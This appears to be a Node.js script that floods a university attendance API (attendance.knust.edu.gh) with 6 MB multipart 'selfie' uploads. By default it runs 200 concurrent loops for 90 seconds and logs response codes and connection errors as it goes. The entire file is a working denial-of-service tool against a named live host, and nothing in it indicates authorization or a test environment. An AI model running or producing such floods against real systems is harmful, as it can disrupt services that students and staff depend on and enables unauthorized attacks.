// Completing 6MB multipart uploads, N concurrent loops, until DUR.
const H="attendance.knust.edu.gh", N=parseInt(process.env.N||"200"), DUR=parseInt(process.env.DUR||"90");
const body=Buffer.alloc(6*1048576,0x41);
const pre=Buffer.from(`------x\r\nContent-Disposition: form-data; name="student_id"\r\n\r\n23345678\r\n------x\r\nContent-Disposition: form-data; name="selfie"; filename="s.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`);
const post=Buffer.from(`\r\n------x--\r\n`);
const buf=Buffer.concat([pre,body,post]);
let sent=0; const codes={}; const T0=Date.now();
const one=async()=>{while(Date.now()-T0<DUR*1000){sent++;try{const r=await fetch(`https://${H}/api/sessions/11111111-1111-4111-8111-111111111111/attend/`,{method:"POST",body:buf,headers:{"content-type":"multipart/form-data; boundary=----x"},signal:AbortSignal.timeout(120000)});codes[r.status]=(codes[r.status]||0)+1;}catch(e){codes[e.cause?.code||e.name]=(codes[e.cause?.code||e.name]||0)+1}}};
for(let i=0;i<N;i++)one();
const iv=setInterval(()=>console.log(JSON.stringify({t:((Date.now()-T0)/1000)|0,sent,codes})),10000);
setTimeout(()=>{clearInterval(iv);console.log("done",sent,JSON.stringify(codes));process.exit(0)},DUR*1000+70000);
